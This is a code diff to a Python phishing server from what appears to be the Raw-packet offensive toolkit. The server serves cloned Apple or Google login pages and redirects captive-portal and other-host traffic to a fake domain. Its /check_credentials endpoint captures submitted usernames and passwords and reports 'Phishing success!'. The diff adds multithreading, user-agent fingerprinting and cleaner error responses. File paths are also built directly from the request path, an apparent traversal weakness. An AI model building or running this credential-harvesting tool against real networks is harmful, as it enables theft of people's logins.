@@ -10,6 +10,7 @@ Copyright 2020, Raw-packet Project
 # region Import
 from raw_packet.Utils.base import Base
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from socketserver import ThreadingMixIn
 from typing import List, Dict, Tuple, Callable, Union
 from json import loads, decoder
 from user_agents import parse as user_agent_parse
@@ -35,19 +36,23 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
 
     BaseHTTPRequestHandler.server_version = 'nginx'
     BaseHTTPRequestHandler.sys_version = ''
+    # BaseHTTPRequestHandler.protocol_version = 'HTTP/1.1'
+    # BaseHTTPRequestHandler.close_connection = True
 
     # region Errors
     def error_SendResponse(self, error_code: int):
-        self.send_response(error_code)
-        self.send_header('Content-Type', 'text/html')
-        self.send_header('Connection', 'close')
-        self.end_headers()
         full_path: str = join(self.server.site_path + self.server.separator + 'errors' +
                               self.server.separator + str(error_code) + '.html')
         if isfile(full_path):
-            self.wfile.write(open(full_path, 'rb').read())
+            response: bytes = open(full_path, 'rb').read()
         else:
-            self.wfile.write(bytes('<html>ERROR</html>', encoding='utf-8'))
+            response: bytes = bytes('<html>ERROR</html>', encoding='utf-8')
+        self.send_response(error_code)
+        self.send_header('Content-Type', 'text/html; charset=UTF-8')
+        self.send_header('Content-Length', str(len(response)))
+        self.send_header('Connection', 'close')
+        self.end_headers()
+        self.wfile.write(response)
 
     def error_BadRequest(self):
         self.error_SendResponse(error_code=400)
@@ -59,96 +64,136 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
         self.error_SendResponse(error_code=411)
 
     def error_CheckCreds(self):
+        response: bytes = bytes('ERROR', 'utf-8')
         self.send_response(200)
+        self.send_header('Content-Type', 'text/plain; charset=UTF-8')
+        self.send_header('Content-Length', str(len(response)))
         self.send_header('Connection', 'close')
         self.end_headers()
-        self.wfile.write(bytes('ERROR', 'utf-8'))
+        self.wfile.write(response)
 
-    def redirect(self, status_code: int = 302):
-        self.send_response(status_code)
+    def redirect(self):
+        response: bytes = bytes('<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE>'
+                                '<META http-equiv="Cache-control" content="no-cache">'
+                                '<META http-equiv="Pragma" content="no-cache">'
+                                '<META http-equiv="Expires" content="-1">'
+                                '<META http-equiv="refresh" content="1; URL=http://' + self.server.site_domain +
+                                '/"></HEAD></HTML>', 'utf-8')
+        self.send_response(302)
         self.send_header('Location', 'http://' + self.server.site_domain + '/')
+        self.send_header('Content-Type', 'text/html; charset=UTF-8')
+        self.send_header('Content-Length', str(len(response)))
         self.send_header('Connection', 'close')
         self.end_headers()
-        self.wfile.write(bytes('<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE>'
-                               '<META http-equiv="Cache-control" content="no-cache">'
-                               '<META http-equiv="Pragma" content="no-cache">'
-                               '<META http-equiv="Expires" content="-1">'
-                               '<META http-equiv="refresh" content="1; URL=http://' + self.server.site_domain +
-                               '/"></HEAD></HTML>', 'utf-8'))
+        self.wfile.write(response)
     # endregion
 
-    # region GET request
-    def do_GET(self):
-
-        if 'User-Agent' not in self.headers:
-            self.error_BadRequest()
-
-        if 'Host' not in self.headers:
-            self.error_BadRequest()
-
-        if self.server.site_domain is not None:
-            if self.headers['Host'] == 'captive.apple.com':
-                self.redirect(status_code=200)
-                return
-            if self.headers['Host'] != self.server.site_domain:
-                self.redirect()
-                return
-
-        if self.server.site_path.endswith(self.server.separator + 'apple') and \
-                ('Mac OS' in self.headers['User-Agent'] or 'CaptiveNetworkSupport' in self.headers['User-Agent']):
-            self.server.site_path += self.server.separator + 'macos_native'
-
-        if self.server.separator == '\\':
-            path: str = self.path.replace('/', '\\')
+    # region Parse User-agent header
+    @staticmethod
+    def parse_user_agent(user_agent: Union[None, str]) -> Dict[str, str]:
+        result: Dict[str, str] = {
+            'os': 'Other',
+            'browser': 'Other'
+        }
+        if user_agent is None:
+            raise AttributeError('User-Agent header not found!')
+        if 'CaptiveNetworkSupport' in user_agent and 'wispr' in user_agent:
+            result['os']: str = 'Mac OS X'
+            result['browser']: str = 'Captive'
         else:
-            path: str = self.path
+            device = user_agent_parse(user_agent_string=user_agent)
+            result['os']: str = device.os.family
+            result['browser']: str = device.browser.family
+        return result
+    # endregion
 
+    # region Check Host header
+    def check_host(self, host: Union[None, str]) -> None:
+        if host is None:
+            raise AttributeError('Host header not found!')
+        if self.headers['Host'] != self.server.site_domain:
+            raise NameError
+    # endregion
+
+    # region Get full to file
+    def _get_full_path(self, path: str = '/') -> str:
+        if self.server.separator == '\\':
+            path: str = path.replace('/', '\\')
         if path == self.server.separator:
             full_path: str = join(self.server.site_path + self.server.separator + 'index.html')
         else:
             full_path: str = join(self.server.site_path + self.path)
+        return full_path
+    # endregion
 
-        content_type: str = 'text/html'
-        if full_path.endswith('.html'):
+    # region Get content type by file extension
+    def _get_content_type(self, path: str = '/index.html') -> str:
+        content_type: str = 'text/plain'
+        if path.endswith('.html'):
             content_type = 'text/html'
-        elif full_path.endswith('.ico'):
+        elif path.endswith('.ico'):
             content_type = 'image/x-icon'
-        elif full_path.endswith('.js'):
+        elif path.endswith('.js'):
             content_type = 'text/javascript'
-        elif full_path.endswith('.css'):
+        elif path.endswith('.css'):
             content_type = 'text/css'
-        elif full_path.endswith('.ttf'):
+        elif path.endswith('.ttf'):
             content_type = 'font/ttf'
-        elif full_path.endswith('.woff'):
+        elif path.endswith('.woff'):
             content_type = 'font/woff'
-        elif full_path.endswith('.woff2'):
+        elif path.endswith('.woff2'):
             content_type = 'font/woff2'
-        elif full_path.endswith('.eot'):
+        elif path.endswith('.eot'):
             content_type = 'application/vnd.ms-fontobject'
-        elif full_path.endswith('.gif'):
+        elif path.endswith('.gif'):
             content_type = 'image/gif'
-        elif full_path.endswith('.png'):
+        elif path.endswith('.png'):
             content_type = 'image/png'
-        elif full_path.endswith('.svg'):
+        elif path.endswith('.svg'):
             content_type = 'image/svg+xml'
-        elif full_path.endswith('.jpg') or full_path.endswith('.jpeg'):
+        elif path.endswith('.jpg') or path.endswith('.jpeg'):
             content_type = 'image/jpeg'
-        elif full_path.endswith('.tif') or full_path.endswith('.tiff'):
+        elif path.endswith('.tif') or path.endswith('.tiff'):
             content_type = 'image/tiff'
-        if full_path.endswith('.py'):
+        if path.endswith('.py'):
             self.error_FileNotFound()
-        if full_path.endswith('.php'):
+        if path.endswith('.php'):
+            self.error_FileNotFound()
+        return content_type + '; charset=UTF-8'
+    # endregion
+
+    # region GET request
+    def do_GET(self):
+        try:
+            user_agent: Dict[str, str] = self.parse_user_agent(self.headers['User-Agent'])
+            self.check_host(self.headers['Host'])
+
+            if self.server.site_path.endswith(self.server.separator + 'apple') and user_agent['os'] == 'Mac OS X':
+                self.server.site_path += self.server.separator + 'macos_native'
+                full_path = self._get_full_path(path=self.path)
+            else:
+                full_path = self._get_full_path(path=self.path)
+            content_type = self._get_content_type(path=full_path)
+
+            if isfile(full_path):
+                response: bytes = open(full_path, 'rb').read()
+                self.send_response(200)
+                self.send_header('Content-Type', content_type)
+                self.send_header('Content-Length', str(len(response)))
+                self.send_header('Connection', 'close')
+                self.end_headers()
+                self.wfile.write(response)
+            else:
+                raise FileNotFoundError
+
+        except AttributeError:
+            self.error_BadRequest()
+
+        except FileNotFoundError:
             self.error_FileNotFound()
 
-        if isfile(full_path):
-            self.send_response(200)
-            self.send_header('Content-Type', content_type)
-            self.send_header('Connection', 'close')
-            self.end_headers()
-            self.wfile.write(open(full_path, 'rb').read())
-        else:
-            self.error_FileNotFound()
-
+        except NameError:
+            self.redirect()
     # endregion
 
     # region POST request
@@ -161,9 +206,13 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
             post_data: Dict = loads(post_data)
 
             if form == '/check_username':
+                response: bytes = bytes(post_data['username'], 'utf-8')
                 self.send_response(200)
+                self.send_header('Content-Type', 'text/plain; charset=UTF-8')
+                self.send_header('Content-Length', str(len(response)))
+                self.send_header('Connection', 'close')
                 self.end_headers()
-                self.wfile.write(bytes(post_data['username'], 'utf-8'))
+                self.wfile.write(response)
 
             elif form == '/check_credentials':
                 self.server.base.print_success('Phishing success!'
@@ -190,11 +239,39 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
 
     # region HEAD request
     def do_HEAD(self):
-        if self.server.site_domain is not None:
-            if self.headers['Host'] != self.server.site_domain:
-                self.redirect()
-                return
-        self.error_BadRequest()
+        try:
+            user_agent: Dict[str, str] = self.parse_user_agent(self.headers['User-Agent'])
+            self.check_host(self.headers['Host'])
+
+            full_path = self._get_full_path(path=self.path)
+            content_type = self._get_content_type(path=self.path)
+
+            if isfile(full_path):
+                self.send_response(200)
+                self.send_header('Content-Type', content_type)
+                self.send_header('Connection', 'close')
+                self.end_headers()
+            else:
+                raise FileNotFoundError
+
+        except AttributeError:
+            self.send_response(400)
+            self.send_header('Content-Type', 'text/html')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+
+        except FileNotFoundError:
+            self.send_response(404)
+            self.send_header('Content-Type', 'text/html')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+
+        except NameError:
+            self.send_response(302)
+            self.send_header('Location', 'http://' + self.server.site_domain + '/')
+            self.send_header('Connection', 'close')
+            self.end_headers()
+
     # endregion
 
     # region Log messages
@@ -202,13 +279,15 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
         if not self.server.quiet:
             user_agent = self.headers['User-Agent']
             host = self.headers['Host']
-            if user_agent is None:
-                user_agent = 'None'
             if host is None:
                 host = 'None'
+            if user_agent is None:
+                user_agent = 'None'
+            parsed_user_agent = self.parse_user_agent(user_agent)
             self.server.base.print_info('Phishing client address: ', self.address_string(),
-                                        ' user-agent: ', user_agent, ' host: ', host,
-                                        ' request: ', '%s' % format % args)
+                                        ' os: ', parsed_user_agent['os'],
+                                        ' browser: ', parsed_user_agent['browser'],
+                                        ' host: ', host, ' request: ', '%s' % format % args)
     # endregion
 
 # endregion
@@ -225,13 +304,21 @@ class _PhishingHTTPServer(HTTPServer):
                  quiet: bool = False):
         super().__init__(server_address, RequestHandlerClass)
         self.site_path: str = site_path
-        self.site_domain: Union[None, str] = site_domain
+        self.site_domain: str = site_domain
         self.base: Base = base_instance
         self.quiet: bool = quiet
         if self.base.get_platform().startswith('Windows'):
             self.separator: str = '\\'
         else:
             self.separator: str = '/'
+# endregion
+
+
+# region Multi Threaded Phishing Server
+class _MultiThreadedPhishingServer(ThreadingMixIn, _PhishingHTTPServer):
+    """
+    Handle requests in a separate thread.
+    """
 # endregion
 
 
@@ -249,18 +336,19 @@ class PhishingServer:
     def start(self,
               address: str = '0.0.0.0',
               port: int = 80,
-              site: str = 'google',
-              redirect: Union[None, str] = None,
+              site: str = 'apple',
+              redirect: str = 'authentication.net',
               quiet: bool = False):
         """
         Start Phishing HTTP server
         :param address: IPv4 address for listening (default: '0.0.0.0')
         :param port: TCP port for listening (default: 80)
-        :param site: Set full path to site or phishing site template 'apple' or 'google'
-        :param redirect: Set phishing site domain for redirect (example: )
+        :param site: Set full path to site or phishing site template 'apple' or 'google' (default: 'apple')
+        :param redirect: Set phishing site domain for redirect (default: 'authentication.net')
         :param quiet: Quiet mode
         :return: None
         """
+        phishing: Union[None, _MultiThreadedPhishingServer] = None
         try:
             if self._base.get_platform().startswith('Windows'):
                 separator: str = '\\'
@@ -283,20 +371,25 @@ class PhishingServer:
                     'Could not found site template: ' + self._base.error_text(site) + \
                     ' in templates directory: ' + self._base.info_text(current_path)
 
-            httpd = _PhishingHTTPServer(server_address=(address, port),
-                                        RequestHandlerClass=_PhishingHTTPRequestHandler,
-                                        site_path=site_path,
-                                        site_domain=redirect,
-                                        base_instance=self._base,
-                                        quiet=quiet)
-            httpd.serve_forever()
+            phishing = \
+                _MultiThreadedPhishingServer(server_address=(address, port),
+                                             RequestHandlerClass=_PhishingHTTPRequestHandler,
+                                             base_instance=self._base,
+                                             site_path=site_path,
+                                             site_domain=redirect,
+                                             quiet=quiet)
+            phishing.serve_forever()
 
         except KeyboardInterrupt:
+            if phishing is not None:
+                phishing.server_close()
             if not quiet:
                 self._base.print_info('Exit')
             exit(0)
 
         except AssertionError as Error:
+            if phishing is not None:
+                phishing.server_close()
             if not quiet:
                 self._base.print_error(Error.args[0])
             exit(1)
